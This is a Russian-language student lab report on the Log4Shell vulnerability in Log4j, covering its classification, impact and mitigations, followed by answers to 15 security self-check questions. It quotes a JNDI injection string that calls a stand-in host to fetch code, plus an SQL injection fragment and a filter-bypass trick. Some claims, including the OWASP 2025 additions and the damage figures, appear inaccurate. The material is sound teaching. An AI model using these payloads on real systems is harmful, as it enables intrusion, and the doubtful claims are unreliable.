#  Лабораторная работа №1: Log4Shell + Вопросы 



##  1. Инцидент: Log4Shell (CVE-2021-44228)

**Компания:** Apache Foundation  
**Компонент:** Log4j 2.x (библиотека для логирования в Java)



###  Суть уязвимости

Логгер выполнял подстановку строк из JNDI. Если передать в заголовок запроса `${jndi:ldap://evil.com/x}`, сервер скачивал и запускал вредоносный код

**Классификация:**
- **CVE:** 2021-44228 (CVSS 10.0 - максимальный балл)
- **CWE:** 917 (неправильная обработка выражений)
- **OWASP 2021:** A06 (уязвимые компоненты) и A03 (инъекции)



###  Как обнаружили

В ноябре 2021 года сотрудники Alibaba заметили странные JNDI-запросы в логах. Через неделю началась массовая эксплуатация уязвимости по всему миру



###  Ущерб

- **Деньги:** совокупный ущерб оценивается примерно в 10 миллиардов долларов
- **Данные:** утекли AWS-ключи, пароли, данные клиентов
- **Время:** Amazon, Microsoft, Tesla и другие отключали свои сервисы на 2–3 дня для экстренного патча



###  Что сделали после

1. Apache выпустила патчи 2.15.0, затем 2.16.0 (в которых JNDI-подстановки отключены по умолчанию)
2. Компании массово ставили WAF-правила на блокировку строк с `${jndi:`.
3. Проводили аудит всех Java-приложений на наличие уязвимой версии



###  Что нужно было сделать до

- Регулярно обновлять библиотеки (особенно такие популярные, как Log4j)
- Включить флаг `log4j2.formatMsgNoLookups=true` (это можно было сделать даже без патча)
- Использовать SCA-сканеры (Snyk, Dependabot) для поиска уязвимых зависимостей



###  Где ловить на этапах разработки

- **На этапе сборки:** внедрить SCA (анализ состава ПО) - он сразу найдет старую версию
- **На этапе тестирования:** прогнать SAST-сканеры, которые подсветят опасные вызовы
- **На этапе эксплуатации:** настроить SIEM на мониторинг подозрительных LDAP-запросов



###  Привязка к терминам ФСТЭК

- **Источник угрозы:** любой хакер с доступом в интернет 
- **Угроза:** удалённое выполнение кода на сервере
- **Уязвимость:** старая версия Log4j без фильтрации JNDI  
- **Объект воздействия:** сервер приложений, переменные окружения (где хранятся ключи)
- **Последствия:** утечка данных, простой сервисов, финансовые потери



###  Какие меры применяли (и что из этого следует)

- **Превентивные:** обновить библиотеку до безопасной версии - это главное, что надо было сделать заранее
- **Детективные:** WAF и мониторинг трафика, чтобы заметить атаку в процессе
- **Корректирующие:** откат на бэкапы и срабатывание плана реагирования, если атака уже произошла



##  2. Вопросы для самопроверки (15 шт.)

**1** **Угроза** - событие (украдут базу). **Уязвимость** - дыра в системе. **Риск** - вероятность × ущерб. Риском управляем, уязвимость чиним, угрозу убрать нельзя



**2** **Валидация на JS** - не защита, её отключают или обходят. Сервер проверяет всё сам



**3** **Аутентификация** - кто ты (логин+пароль). **Авторизация** - что тебе можно (права). Авторизация ломается чаще - забывают проверять права на каждый запрос



**4** Экранирование кавычек не помогло бы, потому что можно подставить `1 OR 1=1` без кавычек (в числовом поле)



**5** **Параметризация** отделяет код от данных. **Фильтрация `OR`** - чёрный список, обходится через `OORR` или `||`.



**6** **Хранимая XSS** - отображается всем, кто зашёл на страницу. **Отражённая** - надо перейти по ссылке. Хранимая опаснее из-за массовости



**7** **CVE** - конкретный баг в продукте. **CWE** - тип уязвимости. Не взаимозаменяемы, используются вместе



**8** **Принцип полного посредничества** - проверять права при каждом действии. Если нарушить → **Broken Access Control** (лезут в чужие аккаунты через ID в URL)



**9** **SHA-256** - быстрая, для паролей нужны **медленные** алгоритмы - **bcrypt**, **scrypt**, **Argon2**. Иначе перебор паролей на видеокартах займёт часы



**10** Пример дефекта проектирования, который **нельзя исправить патчем** - отсутствие **2FA** в архитектуре. Надо переписывать модуль входа



**11** В **OWASP Top 10:2025** добавили:
- **Insecure Design** - ошибки на этапе проектирования.
- **SSRF** - серверные подделки запросов



**12** **Fail open** - при сбое открывает доступ всем. Надо **fail closed** - при ошибке всё блокировать



**13** **SBOM** - список всех библиотек. Нужен, чтобы быстро найти, где используется уязвимая версия



**14** **CVSS 9.8** - техническая оценка, но в контексте банковского сервера **CVSS 5.0** может быть опаснее из-за бизнес-ущерба



**15** **STRIDE для регистрации**:
- **S** (Spoofing) - регистрация за чужого
- **T** (Tampering) - подмена `is_admin`
- **R** (Repudiation) - нет логов
- **I** (Info Disclosure) - пароль по HTTP
- **D** (DoS) - 5000 аккаунтов без капчи
- **E** (Elevation) - обычный юзер → админ



##  Итог

**g4Shell**-классический пример того, как один небольшой недочёт в популярной библиотеке ставит под угрозу миллионы серверов. Главный урок: зависимости нужно держать в актуальном состоянии, а пользовательскому вводу никогда не доверять. Ответы на вопросы из лекции показывают, что безопасность - это не только код, но и архитектура, процессы и человеческий фактор
